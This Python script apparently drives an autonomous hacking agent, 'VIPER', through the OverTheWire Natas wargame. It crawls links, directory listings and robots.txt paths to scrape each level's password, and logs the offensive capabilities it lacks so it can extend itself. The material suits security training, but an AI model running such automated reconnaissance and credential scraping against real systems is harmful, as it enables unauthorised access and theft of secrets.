#!/usr/bin/env python3
"""
VIPER Learning Mode - Fail, Analyze, Adapt
===========================================

No hand-holding. VIPER tries, fails, records what's missing,
and builds its own solutions.
"""
import sys
sys.stdout.reconfigure(encoding='utf-8')
sys.path.insert(0, 'core')

from agentic_viper import AgenticVIPER, Tools, Memory
import json
from pathlib import Path
from datetime import datetime

class LearningVIPER(AgenticVIPER):
    """VIPER that learns from failures"""
    
    def __init__(self):
        super().__init__()
        self.failures_path = Path(__file__).parent / "memory" / "failures.json"
        self.failures_path.parent.mkdir(exist_ok=True)
        self.failures = self._load_failures()
    
    def _load_failures(self):
        if self.failures_path.exists():
            return json.loads(self.failures_path.read_text())
        return {"levels": {}, "missing_capabilities": [], "insights": []}
    
    def _save_failures(self):
        self.failures_path.write_text(json.dumps(self.failures, indent=2))
    
    def analyze_failure(self, level: int, url: str, body: str, tried: list):
        """When stuck, analyze WHY and record what's needed"""
        
        analysis = {
            "level": level,
            "timestamp": datetime.now().isoformat(),
            "tried": tried,
            "observations": [],
            "hypothesis": None,
            "needed_capability": None
        }
        
        # Analyze what we saw
        html_info = Tools.extract_from_html(body)
        
        # Check patterns we recognize but can't exploit yet
        if '/files/' in body or 'files/' in str(html_info.get('links', [])):
            analysis["observations"].append("Directory path detected in HTML")
            analysis["hypothesis"] = "Need to browse directory listing"
            analysis["needed_capability"] = "directory_enumeration"
        
        if 'robots.txt' in str(self.memory.data.get("successful_attacks", [])):
            # We found robots but didn't follow paths
            analysis["observations"].append("Found robots.txt but didn't explore paths")
            analysis["hypothesis"] = "Need to recursively explore discovered paths"
            analysis["needed_capability"] = "path_explorer"
        
        if any('referer' in str(c).lower() or 'from' in str(c).lower() for c in html_info.get('comments', [])):
            analysis["observations"].append("Referer/origin hint in comments")
            analysis["needed_capability"] = "header_manipulation"
        
        if 'cookie' in body.lower() or 'session' in body.lower():
            analysis["observations"].append("Cookie/session handling detected")
            analysis["needed_capability"] = "session_manipulation"
        
        if 'base64' in body.lower() or 'encode' in body.lower():
            analysis["observations"].append("Encoding mentioned")
            analysis["needed_capability"] = "encoding_chain"
        
        if 'include' in body.lower() and 'secret' in body.lower():
            analysis["observations"].append("PHP include with secret file")
            analysis["needed_capability"] = "source_inclusion"
        
        # Record failure
        self.failures["levels"][str(level)] = analysis
        
        # Track missing capabilities
        if analysis["needed_capability"]:
            if analysis["needed_capability"] not in self.failures["missing_capabilities"]:
                self.failures["missing_capabilities"].append(analysis["needed_capability"])
        
        self._save_failures()
        
        self.log(f"FAILURE ANALYSIS: {analysis['hypothesis'] or 'Unknown'}", "LEARN")
        if analysis["needed_capability"]:
            self.log(f"NEED: {analysis['needed_capability']}", "LEARN")
        
        return analysis
    
    def try_improvise(self, level: int, url: str, auth: tuple, body: str) -> dict:
        """Try to improvise a solution based on observations"""
        
        result = {"success": False}
        html_info = Tools.extract_from_html(body)
        
        # Improvisation 1: Follow links we find
        for link in html_info.get("links", [])[:10]:
            if link.startswith('#') or link.startswith('javascript'):
                continue
            
            full_url = link if link.startswith('http') else f"{url.rstrip('/')}/{link.lstrip('/')}"
            try:
                status, link_body, _ = Tools.http_get(full_url, auth=auth)
                if status == 200:
                    pwd = Tools.extract_password(link_body, auth[1])
                    if pwd:
                        self.log(f"IMPROVISED: Found password following link {link}", "SUCCESS")
                        result["success"] = True
                        result["password"] = pwd
                        result["method"] = f"followed_link:{link}"
                        return result
            except:
                pass
        
        # Improvisation 2: Check directory listings
        for link in html_info.get("links", []):
            if '/' in link and not link.endswith('.html') and not link.endswith('.php'):
                dir_url = f"{url.rstrip('/')}/{link.split('/')[0]}/"
                try:
                    status, dir_body, _ = Tools.http_get(dir_url, auth=auth)
                    if status == 200 and 'Index of' in dir_body:
                        # Found directory listing!
                        self.log(f"IMPROVISED: Found directory listing at {dir_url}", "SUCCESS")
                        # Look for interesting files
                        files = Tools.extract_from_html(dir_body).get("links", [])
                        for f in files:
                            if 'user' in f.lower() or 'pass' in f.lower() or '.txt' in f:
                                file_url = f"{dir_url}{f}"
                                _, file_body, _ = Tools.http_get(file_url, auth=auth)
                                pwd = Tools.extract_password(file_body, auth[1])
                                if pwd:
                                    result["success"] = True
                                    result["password"] = pwd
                                    result["method"] = f"dir_listing:{f}"
                                    return result
                except:
                    pass
        
        # Improvisation 3: Try robots.txt paths
        _, robots, _ = Tools.http_get(f"{url}/robots.txt", auth=auth)
        if 'Disallow' in robots:
            paths = [p.strip() for p in robots.split('\n') if 'Disallow:' in p]
            for p in paths:
                path = p.replace('Disallow:', '').strip()
                if path and path != '/':
                    try:
                        test_url = f"{url.rstrip('/')}{path}"
                        status, path_body, _ = Tools.http_get(test_url, auth=auth)
                        if status == 200:
                            pwd = Tools.extract_password(path_body, auth[1])
                            if pwd:
                                result["success"] = True
                                result["password"] = pwd
                                result["method"] = f"robots_path:{path}"
                                return result
                            # Check for more links
                            for link in Tools.extract_from_html(path_body).get("links", []):
                                link_url = f"{url.rstrip('/')}{path.rstrip('/')}/{link}"
                                _, link_body, _ = Tools.http_get(link_url, auth=auth)
                                pwd = Tools.extract_password(link_body, auth[1])
                                if pwd:
                                    result["success"] = True
                                    result["password"] = pwd
                                    result["method"] = f"robots_sublink:{link}"
                                    return result
                    except:
                        pass
        
        return result


def run_learning():
    """Let VIPER learn by doing"""
    
    print("="*60)
    print("VIPER LEARNING MODE")
    print("="*60)
    print("Fail -> Analyze -> Adapt -> Retry")
    print()
    
    passwords = {0: "natas0"}
    current_level = 0
    max_level = 15  # Try first 15 levels
    
    while current_level <= max_level:
        if current_level not in passwords:
            print(f"\n[BLOCKED] No password for level {current_level}")
            break
        
        url = f"http://natas{current_level}.natas.labs.overthewire.org"
        user = f"natas{current_level}"
        passwd = passwords[current_level]
        
        print(f"\n{'='*60}")
        print(f"LEVEL {current_level}")
        print(f"{'='*60}")
        
        viper = LearningVIPER()
        result = viper.hack(url, auth=(user, passwd), max_attempts=30)
        
        if result["success"] and result.get("password"):
            passwords[current_level + 1] = result["password"]
            print(f"\n[SOLVED] {result['password']}")
            current_level += 1
        else:
            # Standard attack failed - try to improvise
            print(f"\n[STANDARD FAILED] Trying improvisation...")
            
            status, body, _ = Tools.http_get(url, auth=(user, passwd))
            improv = viper.try_improvise(current_level, url, (user, passwd), body)
            
            if improv["success"]:
                passwords[current_level + 1] = improv["password"]
                print(f"[IMPROVISED] {improv['method']} -> {improv['password']}")
                
                # Record successful improvisation
                viper.memory.remember_success(url, improv["method"], "improvised", improv["password"])
                current_level += 1
            else:
                # Analyze failure
                viper.analyze_failure(current_level, url, body, result.get("techniques_tried", []))
                print(f"[STUCK] Level {current_level} - recorded for learning")
                break
    
    print("\n" + "="*60)
    print("LEARNING SUMMARY")
    print("="*60)
    print(f"Solved: {current_level} levels")
    
    # Show what VIPER learned it needs
    viper = LearningVIPER()
    if viper.failures.get("missing_capabilities"):
        print(f"Missing capabilities identified: {viper.failures['missing_capabilities']}")

if __name__ == "__main__":
    run_learning()
